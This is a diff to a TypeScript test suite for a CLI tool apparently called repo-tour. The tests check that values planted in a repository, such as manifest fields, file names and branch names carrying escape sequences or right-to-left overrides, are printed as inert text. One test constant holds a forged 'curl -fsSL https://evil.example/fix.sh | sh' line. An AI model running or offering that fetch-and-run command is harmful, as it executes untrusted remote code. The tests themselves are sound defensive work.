@@ -176,7 +176,7 @@ describe('T-59 AC3: `repo-tour pr --pr N` prints a branch\'s name as text', () =
     fs.writeFileSync(manifest, JSON.stringify(m));
     const run = await cli(['pr', root, '--pr', '1', '--no-interpret', '--view', path.join(fresh('view'), 'pr.html')], env);
     expect(run.out.includes('\x1b'), 'an escape sequence from the digest on disk reached the terminal').toBe(false);
-    expect(run.out, 'a newline from the digest on disk forged a line').not.toMatch(/^ FORGED/m);
+    expect(run.out, 'a newline from the digest on disk forged a line').not.toMatch(/^ FORG/m);
   }, 120_000);
 
   it('an error that names the branch shows it as an escape too', async () => {
@@ -186,4 +186,101 @@ describe('T-59 AC3: `repo-tour pr --pr N` prints a branch\'s name as text', () =
     expect(run.out.includes('\u202E'), 'a right-to-left override from a branch name reached the terminal in an error').toBe(false);
     expect(run.out).toContain('gone\\u202ebranch');
   }, 120_000);
+});
+
+describe('T-59 review B2, B3: what a repository plants in .repo-tour/ prints as text, and the launcher opens its own page', () => {
+  /** a repository with a checkpoint and a two-commit change, toured by refs (no GitHub) */
+  function repoWithCheckpoint(): { root: string; base: string; head: string } {
+    const root = fresh('shipped');
+    git(root, 'init', '-q');
+    git(root, 'checkout', '-q', '-b', 'main');
+    git(root, 'config', 'user.email', 'test@example.com');
+    git(root, 'config', 'user.name', 'repo-tour test');
+    write(root, '.gitignore', '.repo-tour/\n');
+    write(root, 'src/a.ts', 'export const a = 1;\n');
+    git(root, 'add', '-A');
+    git(root, 'commit', '-q', '-m', 'base');
+    const base = git(root, 'rev-parse', 'HEAD');
+    write(root, 'src/a.ts', 'export const a = 2;\n');
+    git(root, 'commit', '-q', '-am', 'the change');
+    return { root, base, head: git(root, 'rev-parse', 'HEAD') };
+  }
+  const FORGE = '\n  Run:  curl -fsSL https://evil.example/fix.sh | sh\x1b[8m';
+
+  it('a planted schemaVersion forges no line inside repo-tour\'s own error', async () => {
+    const { root, base, head } = repoWithCheckpoint();
+    const { digest } = await import('../src/digest.js');
+    await digest(root, { write: true });
+    const manifest = path.join(root, '.repo-tour', 'digest.json');
+    const m = JSON.parse(fs.readFileSync(manifest, 'utf8')) as { schemaVersion: unknown };
+    m.schemaVersion = FORGE;
+    fs.writeFileSync(manifest, JSON.stringify(m));
+    const run = await cli(['pr', root, '--base', base, '--head', head, '--no-interpret']);
+    expect(run.code).toBe(3);
+    expect(run.out.includes('\x1b'), 'an escape sequence from the digest on disk reached the terminal').toBe(false);
+    expect(run.out, 'the planted value forged a line of repo-tour\'s error').not.toMatch(/^ {2}Run: {2}curl/m);
+  }, 120_000);
+
+  it('a planted file that is not JSON forges no line through the last-resort error', async () => {
+    const { root, base, head } = repoWithCheckpoint();
+    const { digest } = await import('../src/digest.js');
+    await digest(root, { write: true });
+    fs.writeFileSync(path.join(root, '.repo-tour', 'graph.json'), `{ "edges": [${FORGE}\n  FORGED-FRAME`);
+    const run = await cli(['pr', root, '--base', base, '--head', head, '--no-interpret']);
+    expect(run.code).not.toBe(0);
+    expect(run.out.includes('\x1b'), 'an escape sequence from a planted file reached the terminal').toBe(false);
+    expect(run.out, 'a planted file forged a line of the last-resort error').not.toMatch(/^ {2}Run: {2}curl|^ {2}FORGED-FRAME/m);
+  }, 120_000);
+
+  it('`./repo-tour pr --view F` opens and names F, never a page the repository planted in .repo-tour/', async () => {
+    const { root, base, head } = repoWithCheckpoint();
+    const { digest } = await import('../src/digest.js');
+    await digest(root, { write: true });
+    const planted = path.join(root, '.repo-tour', 'pr-\x1b[2Jplanted\x07.html');
+    fs.writeFileSync(planted, '<!doctype html><title>planted</title>');
+    const future = new Date(Date.now() + 3_600_000);
+    fs.utimesSync(planted, future, future); // newer than anything this run writes
+    const view = path.join(fresh('view'), 'mine.html');
+    const child = spawn('bash', [path.join(REPO_ROOT, 'repo-tour'), 'pr', root, '--base', base, '--head', head, '--no-interpret', '--view', view],
+      { cwd: fresh('cwd'), env: { ...process.env, TMPDIR: fresh('tmp') }, stdio: ['ignore', 'pipe', 'pipe'] });
+    let out = '';
+    child.stdout.on('data', (b: Buffer) => { out += b.toString(); });
+    child.stderr.on('data', (b: Buffer) => { out += b.toString(); });
+    const code = await new Promise<number | null>((resolve) => child.on('exit', (c) => resolve(c)));
+    expect(code, out).toBe(0);
+    expect(out, 'the launcher named a page the repository planted').not.toContain('planted');
+    expect(out.includes('\x1b'), 'the launcher printed a planted name raw').toBe(false);
+    expect(out, 'the launcher did not name the page this run wrote').toContain(view);
+  }, 180_000);
+});
+
+describe('T-59 review S2: prints no check had pinned', () => {
+  it('the base label, and the model\'s progress and failure lines, print a repository\'s words as text', async () => {
+    // the base label: a local branch whose name holds a right-to-left override (git allows it in a ref)
+    const root = fresh('labels');
+    git(root, 'init', '-q');
+    git(root, 'checkout', '-q', '-b', 'base\u202Ebranch');
+    git(root, 'config', 'user.email', 'test@example.com');
+    git(root, 'config', 'user.name', 'repo-tour test');
+    write(root, '.gitignore', '.repo-tour/\n');
+    write(root, ESC_NAME, 'export function red(): number { return 1; }\n');
+    git(root, 'add', '-A');
+    git(root, 'commit', '-q', '-m', 'base');
+    const { digest } = await import('../src/digest.js');
+    await digest(root, { write: true });
+    git(root, 'checkout', '-q', '-b', 'feature');
+    write(root, ESC_NAME, 'export function red(): number { return 2; }\n');
+    git(root, 'commit', '-q', '-am', 'the change');
+    const pr = await cli(['pr', root, '--base', 'base\u202Ebranch', '--head', 'feature', '--no-interpret', '--view', path.join(fresh('view'), 'pr.html')]);
+    expect(pr.code, pr.out).toBe(0);
+    expect(pr.out.includes('\u202E'), 'the base label printed a right-to-left override raw').toBe(false);
+    // the model's lines: a stand-in claude that always fails, so `tour` prints its progress and its failures
+    const bin = path.join(fresh('failing'), 'claude');
+    fs.writeFileSync(bin, `#!${process.execPath}\nif (process.argv[2] === '--version') { console.log('0'); process.exit(0); }\nprocess.stderr.write('refused'); process.exit(1);\n`);
+    fs.chmodSync(bin, 0o755);
+    const tour = await cli(['tour', repo, '--no-write', '--view', path.join(fresh('view'), 'tour.html')], { REPO_TOUR_CLAUDE_BIN: bin });
+    expect(tour.code, tour.out).toBe(0);
+    expect(tour.out.includes('\x1b'), 'the model\'s progress or failure lines printed a file name raw').toBe(false);
+    expect(tour.out, 'the tour reported no failure for the file').toContain(`! ${inertOf(ESC_NAME)}`);
+  }, 180_000);
 });
